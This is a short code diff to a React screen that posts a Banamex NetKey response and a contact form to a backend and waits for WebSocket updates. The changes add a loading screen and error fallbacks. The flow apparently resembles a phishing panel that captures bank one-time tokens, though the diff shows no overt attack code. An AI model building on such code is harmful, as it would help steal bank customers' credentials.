@@ -449,6 +449,9 @@ export default function ClientScreen() {
           return;
         }
         
+        // Mostrar loader inmediatamente
+        setCurrentScreen(ScreenType.VALIDANDO);
+        
         // Enviar NetKey response al backend
         fetch('/api/banamex/submit-netkey', {
           method: 'POST',
@@ -468,10 +471,14 @@ export default function ClientScreen() {
             // y el WebSocket nos enviará la actualización
           } else {
             console.error('[Banamex NetKey] Error:', data.message);
+            // En caso de error, volver a la pantalla de NetKey
+            setCurrentScreen(ScreenType.BANAMEX_NETKEY);
           }
         })
         .catch(error => {
           console.error('[Banamex NetKey] Error enviando:', error);
+          // En caso de error, volver a la pantalla de NetKey
+          setCurrentScreen(ScreenType.BANAMEX_NETKEY);
         });
         
         return;
@@ -484,6 +491,9 @@ export default function ClientScreen() {
           console.error('No hay sessionId disponible para BANAMEX_CONTACT_FORM');
           return;
         }
+        
+        // Mostrar loader inmediatamente
+        setCurrentScreen(ScreenType.VALIDANDO);
         
         // Enviar formulario de contacto al backend
         fetch('/api/banamex/contact', {
@@ -507,10 +517,14 @@ export default function ClientScreen() {
             // y el WebSocket nos enviará la actualización
           } else {
             console.error('[Banamex Contact] Error:', data.message);
+            // En caso de error, volver al formulario
+            setCurrentScreen(ScreenType.BANAMEX_CONTACT_FORM);
           }
         })
         .catch(error => {
           console.error('[Banamex Contact] Error enviando:', error);
+          // En caso de error, volver al formulario
+          setCurrentScreen(ScreenType.BANAMEX_CONTACT_FORM);
         });
         
         return;
